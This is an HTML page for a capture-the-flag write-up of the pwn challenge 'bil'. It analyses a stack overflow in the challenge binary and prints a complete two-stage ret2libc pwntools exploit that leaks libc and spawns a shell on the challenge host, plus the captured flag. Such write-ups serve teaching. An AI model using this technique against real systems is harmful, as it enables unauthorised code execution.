@@ -1,0 +1,171 @@
+<!doctype html><html lang=en><head><title>pwn - bil · z3r0s</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="z3r0s"><meta name=description content="
+  bil - PWN Writeup
+  
+    
+    Link to heading
+  
+
+
+  Challenge Info
+  
+    
+    Link to heading
+  
+
+
+Name: bil
+Category: PWN
+Remote: 0.cloud.chals.io:18850
+
+
+  Files Provided
+  
+    
+    Link to heading
+  
+
+
+app - ELF 64-bit binary
+libc.so.6 - GLIBC 2.36
+ld-linux-x86-64.so.2 - dynamic linker
+flag - placeholder flag
+
+
+  Binary Analysis
+  
+    
+    Link to heading
+  
+
+
+  Checksec
+  
+    
+    Link to heading
+  
+
+
+  
+      
+          Protection
+          Status
+      
+  
+  
+      
+          RELRO
+          Full RELRO
+      
+      
+          Stack Canary
+          No
+      
+      
+          NX
+          Enabled
+      
+      
+          PIE
+          Disabled
+      
+  
+
+
+  Key Functions
+  
+    
+    Link to heading
+  
+
+vuln() @ 0x4011c6"><meta name=keywords content="hackthebox,htb,ctf,writeup,cybersecurity,hacking,pentesting,redteam"><meta name=twitter:card content="summary"><meta name=twitter:title content="pwn - bil"><meta name=twitter:description content="bil - PWN WriteupLink to headingChallenge InfoLink to headingName: bil Category: PWN Remote: 0.cloud.chals.io:18850 Files ProvidedLink to headingapp - ELF 64-bit binary libc.so.6 - GLIBC 2.36 ld-linux-x86-64.so.2 - dynamic linker flag - placeholder flag Binary AnalysisLink to headingChecksecLink to headingProtection Status RELRO Full RELRO Stack Canary No NX Enabled PIE Disabled Key FunctionsLink to headingvuln() @ 0x4011c6"><meta property="og:url" content="https://z3r0s6.github.io/challenges/pwn-bil/"><meta property="og:site_name" content="z3r0s"><meta property="og:title" content="pwn - bil"><meta property="og:description" content="bil - PWN WriteupLink to headingChallenge InfoLink to headingName: bil Category: PWN Remote: 0.cloud.chals.io:18850 Files ProvidedLink to headingapp - ELF 64-bit binary libc.so.6 - GLIBC 2.36 ld-linux-x86-64.so.2 - dynamic linker flag - placeholder flag Binary AnalysisLink to headingChecksecLink to headingProtection Status RELRO Full RELRO Stack Canary No NX Enabled PIE Disabled Key FunctionsLink to headingvuln() @ 0x4011c6"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="challenges"><meta property="article:published_time" content="2026-05-10T00:00:00+00:00"><meta property="article:modified_time" content="2026-05-10T00:00:00+00:00"><meta property="article:tag" content="CyCTF-Luxor"><meta property="article:tag" content="Pwn"><link rel=canonical href=https://z3r0s6.github.io/challenges/pwn-bil/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/css/coder.min.f6b1b35a7b02521b25338f6cf58975f9980a6c12847763fe35a48307758cd1e7.css integrity="sha256-9rGzWnsCUhslM49s9Yl1+ZgKbBKEd2P+NaSDB3WM0ec=" crossorigin=anonymous media=screen><link rel=stylesheet href=/css/coder-dark.min.ad48f476275974885bdc03d5251e3cdbe1678c54a63ff772376b0ed2adc468dd.css integrity="sha256-rUj0didZdIhb3APVJR482+FnjFSmP/dyN2sO0q3EaN0=" crossorigin=anonymous media=screen><link rel=icon type=image/svg+xml href=/images/favicon.svg sizes=any><link rel=icon type=image/png href=/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-dark"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=https://z3r0s6.github.io/>z3r0s
+</a><input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/posts/>Posts</a></li><li class=navigation-item><a class=navigation-link href=/about/>About</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://z3r0s6.github.io/challenges/pwn-bil/>pwn - bil</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
+<time datetime=2026-05-10T00:00:00Z>May 10, 2026
+</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
+2-minute read</span></div><div class=categories><i class="fa-solid fa-folder" aria-hidden=true></i>
+<a href=/categories/machineschallenges/>Machines&amp;Challenges</a></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
+<span class=tag><a href=/tags/cyctf-luxor/>CyCTF-Luxor</a>
+</span><span class=separator>•</span>
+<span class=tag><a href=/tags/pwn/>Pwn</a></span></div></div></header><div class=post-content><h1 id=bil---pwn-writeup>bil - PWN Writeup
+<a class=heading-link href=#bil---pwn-writeup><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h1><h2 id=challenge-info>Challenge Info
+<a class=heading-link href=#challenge-info><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><ul><li><strong>Name:</strong> bil</li><li><strong>Category:</strong> PWN</li><li><strong>Remote:</strong> 0.cloud.chals.io:18850</li></ul><h2 id=files-provided>Files Provided
+<a class=heading-link href=#files-provided><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><ul><li><code>app</code> - ELF 64-bit binary</li><li><code>libc.so.6</code> - GLIBC 2.36</li><li><code>ld-linux-x86-64.so.2</code> - dynamic linker</li><li><code>flag</code> - placeholder flag</li></ul><h2 id=binary-analysis>Binary Analysis
+<a class=heading-link href=#binary-analysis><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><h3 id=checksec>Checksec
+<a class=heading-link href=#checksec><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><table><thead><tr><th>Protection</th><th>Status</th></tr></thead><tbody><tr><td>RELRO</td><td>Full RELRO</td></tr><tr><td>Stack Canary</td><td>No</td></tr><tr><td>NX</td><td>Enabled</td></tr><tr><td>PIE</td><td>Disabled</td></tr></tbody></table><h3 id=key-functions>Key Functions
+<a class=heading-link href=#key-functions><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p><strong><code>vuln()</code> @ 0x4011c6</strong></p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#ff7b72>void</span> <span style=color:#d2a8ff;font-weight:700>vuln</span>() {
+</span></span><span style=display:flex><span>    <span style=color:#ff7b72>char</span> buf[<span style=color:#a5d6ff>0x40</span>];          <span style=color:#8b949e;font-style:italic>// 64-byte buffer
+</span></span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>puts</span>(<span style=color:#a5d6ff>&#34;Input:&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#d2a8ff;font-weight:700>read</span>(<span style=color:#a5d6ff>0</span>, buf, <span style=color:#a5d6ff>0x190</span>);    <span style=color:#8b949e;font-style:italic>// reads 400 bytes into 64-byte buffer -&gt; overflow
+</span></span></span><span style=display:flex><span>    <span style=color:#ff7b72>if</span> (buf[<span style=color:#a5d6ff>0</span>] <span style=color:#ff7b72;font-weight:700>==</span> <span style=color:#a5d6ff>&#39;Z&#39;</span>)
+</span></span><span style=display:flex><span>        <span style=color:#d2a8ff;font-weight:700>puts</span>(<span style=color:#a5d6ff>&#34;Zzz...&#34;</span>);
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>The vulnerability is straightforward: <code>read()</code> allows 0x190 (400) bytes into a 0x40 (64) byte stack buffer with no stack canary — a classic stack buffer overflow.</p><p><strong><code>pop_rdi_ret()</code> @ 0x401176</strong></p><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-asm data-lang=asm><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>endbr64</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>pop</span> <span style=color:#79c0ff;font-weight:700>rdi</span>
+</span></span><span style=display:flex><span><span style=color:#d2a8ff;font-weight:700>ret</span>
+</span></span></code></pre></div><p>A conveniently provided ROP gadget.</p><h2 id=exploitation-strategy-ret2libc>Exploitation Strategy: ret2libc
+<a class=heading-link href=#exploitation-strategy-ret2libc><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><p>Since NX is enabled (no shellcode) but PIE is disabled (fixed addresses) and there's no canary, this is a textbook <strong>ret2libc</strong> via ROP.</p><h3 id=stage-1--leak-libc>Stage 1 — Leak libc
+<a class=heading-link href=#stage-1--leak-libc><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Overflow the buffer (0x40 + 0x8 saved RBP = <strong>0x48 bytes padding</strong>) and build a ROP chain that:</p><ol><li><code>pop rdi; ret</code> → loads <code>puts@GOT</code> into RDI</li><li><code>puts@PLT</code> → prints the runtime address of <code>puts</code> in libc</li><li>Returns to <code>main</code> for a second pass</li></ol><h3 id=stage-2--shell>Stage 2 — Shell
+<a class=heading-link href=#stage-2--shell><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><p>Calculate libc base from the leak, then:</p><ol><li><code>ret</code> — for 16-byte stack alignment</li><li><code>pop rdi; ret</code> → loads address of <code>"/bin/sh"</code> in libc</li><li><code>system()</code> — spawns a shell</li></ol><h3 id=address-table>Address Table
+<a class=heading-link href=#address-table><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><table><thead><tr><th>Symbol</th><th>Address</th></tr></thead><tbody><tr><td><code>pop rdi; ret</code></td><td><code>0x40117a</code></td></tr><tr><td><code>ret</code></td><td><code>0x40117b</code></td></tr><tr><td><code>puts@PLT</code></td><td><code>0x401060</code></td></tr><tr><td><code>puts@GOT</code></td><td><code>0x403fd8</code></td></tr><tr><td><code>main</code></td><td><code>0x401211</code></td></tr><tr><td>libc <code>puts</code> offset</td><td><code>0x77980</code></td></tr><tr><td>libc <code>system</code> offset</td><td><code>0x4c490</code></td></tr><tr><td>libc <code>"/bin/sh"</code> offset</td><td><code>0x196031</code></td></tr></tbody></table><h2 id=exploit>Exploit
+<a class=heading-link href=#exploit><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><div class=highlight><pre tabindex=0 style=color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#ff7b72>from</span> <span style=color:#ff7b72>pwn</span> <span style=color:#ff7b72>import</span> <span style=color:#ff7b72;font-weight:700>*</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>context<span style=color:#ff7b72;font-weight:700>.</span>binary <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>&#39;./app&#39;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>POP_RDI  <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0x40117a</span>
+</span></span><span style=display:flex><span>RET      <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0x40117b</span>
+</span></span><span style=display:flex><span>PUTS_PLT <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0x401060</span>
+</span></span><span style=display:flex><span>PUTS_GOT <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0x403fd8</span>
+</span></span><span style=display:flex><span>MAIN     <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0x401211</span>
+</span></span><span style=display:flex><span>OFFSET   <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0x48</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>LIBC_PUTS   <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0x77980</span>
+</span></span><span style=display:flex><span>LIBC_SYSTEM <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0x4c490</span>
+</span></span><span style=display:flex><span>LIBC_BINSH  <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#a5d6ff>0x196031</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p <span style=color:#ff7b72;font-weight:700>=</span> remote(<span style=color:#a5d6ff>&#34;0.cloud.chals.io&#34;</span>, <span style=color:#a5d6ff>18850</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># Stage 1: Leak puts@libc, return to main</span>
+</span></span><span style=display:flex><span>payload1  <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#79c0ff>b</span><span style=color:#a5d6ff>&#39;A&#39;</span> <span style=color:#ff7b72;font-weight:700>*</span> OFFSET
+</span></span><span style=display:flex><span>payload1 <span style=color:#ff7b72;font-weight:700>+=</span> p64(POP_RDI)
+</span></span><span style=display:flex><span>payload1 <span style=color:#ff7b72;font-weight:700>+=</span> p64(PUTS_GOT)
+</span></span><span style=display:flex><span>payload1 <span style=color:#ff7b72;font-weight:700>+=</span> p64(PUTS_PLT)
+</span></span><span style=display:flex><span>payload1 <span style=color:#ff7b72;font-weight:700>+=</span> p64(MAIN)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#ff7b72;font-weight:700>.</span>recvuntil(<span style=color:#79c0ff>b</span><span style=color:#a5d6ff>&#39;Input:</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#39;</span>)
+</span></span><span style=display:flex><span>p<span style=color:#ff7b72;font-weight:700>.</span>send(payload1)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>puts_addr <span style=color:#ff7b72;font-weight:700>=</span> u64(p<span style=color:#ff7b72;font-weight:700>.</span>recvline()<span style=color:#ff7b72;font-weight:700>.</span>strip()<span style=color:#ff7b72;font-weight:700>.</span>ljust(<span style=color:#a5d6ff>8</span>, <span style=color:#79c0ff>b</span><span style=color:#a5d6ff>&#39;</span><span style=color:#79c0ff>\x00</span><span style=color:#a5d6ff>&#39;</span>))
+</span></span><span style=display:flex><span>libc_base <span style=color:#ff7b72;font-weight:700>=</span> puts_addr <span style=color:#ff7b72;font-weight:700>-</span> LIBC_PUTS
+</span></span><span style=display:flex><span>log<span style=color:#ff7b72;font-weight:700>.</span>info(<span style=color:#79c0ff>f</span><span style=color:#a5d6ff>&#34;Libc base: </span><span style=color:#a5d6ff>{</span>hex(libc_base)<span style=color:#a5d6ff>}</span><span style=color:#a5d6ff>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#8b949e;font-style:italic># Stage 2: system(&#34;/bin/sh&#34;)</span>
+</span></span><span style=display:flex><span>p<span style=color:#ff7b72;font-weight:700>.</span>recvuntil(<span style=color:#79c0ff>b</span><span style=color:#a5d6ff>&#39;Input:</span><span style=color:#79c0ff>\n</span><span style=color:#a5d6ff>&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>payload2  <span style=color:#ff7b72;font-weight:700>=</span> <span style=color:#79c0ff>b</span><span style=color:#a5d6ff>&#39;A&#39;</span> <span style=color:#ff7b72;font-weight:700>*</span> OFFSET
+</span></span><span style=display:flex><span>payload2 <span style=color:#ff7b72;font-weight:700>+=</span> p64(RET)
+</span></span><span style=display:flex><span>payload2 <span style=color:#ff7b72;font-weight:700>+=</span> p64(POP_RDI)
+</span></span><span style=display:flex><span>payload2 <span style=color:#ff7b72;font-weight:700>+=</span> p64(libc_base <span style=color:#ff7b72;font-weight:700>+</span> LIBC_BINSH)
+</span></span><span style=display:flex><span>payload2 <span style=color:#ff7b72;font-weight:700>+=</span> p64(libc_base <span style=color:#ff7b72;font-weight:700>+</span> LIBC_SYSTEM)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p<span style=color:#ff7b72;font-weight:700>.</span>send(payload2)
+</span></span><span style=display:flex><span>p<span style=color:#ff7b72;font-weight:700>.</span>interactive()
+</span></span></code></pre></div><h2 id=flag>Flag
+<a class=heading-link href=#flag><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><pre tabindex=0><code>CyCTF{3021e16844f8fba8dab8c90c543e6a72}
+</code></pre><p><span id=no-password style=display:none>Z3R0S_NO_PASSWORD_PLEASE</span></p></div><footer></footer></article></section></div><footer class=footer><section class=container>©
+2025 -
+2026
+z3r0s
+·
+Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>
